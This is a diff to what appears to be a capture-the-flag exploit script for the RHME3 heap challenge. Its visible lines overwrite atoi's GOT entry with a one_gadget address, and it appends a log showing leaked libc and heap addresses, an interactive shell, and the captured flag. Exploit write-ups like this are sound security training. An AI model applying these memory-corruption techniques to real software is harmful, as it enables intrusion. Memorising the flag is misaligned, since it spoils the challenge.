@@ -71,3 +71,32 @@ addPlayer('B' * 16 + p64(atoi_got_addr), '', '', '', '')
 editName(p64(one_gadget_addr))
 
 r.interactive()
+
+'''
+[+] Opening connection to pwn.rhme.riscure.com on port 1337: Done
+[*] Libc base addr: 0x7f322fb3b000
+[*] Leaked heap addr: 0xe61630
+[*] Switching to interactive mode
+ 0.- Exit
+1.- Add player
+2.- Remove player
+3.- Select player
+4.- Edit player
+5.- Show player
+6.- Show team
+Your choice: 0.- Go back
+1.- Edit name
+2.- Set attack points
+3.- Set defense points
+4.- Set speed
+5.- Set precision
+Your choice: Enter new name: 0.- Go back
+1.- Edit name
+2.- Set attack points
+3.- Set defense points
+4.- Set speed
+5.- Set precision
+Your choice: $ 
+$ cat flag
+RHME3{h3ap_0f_tr0uble?}
+'''
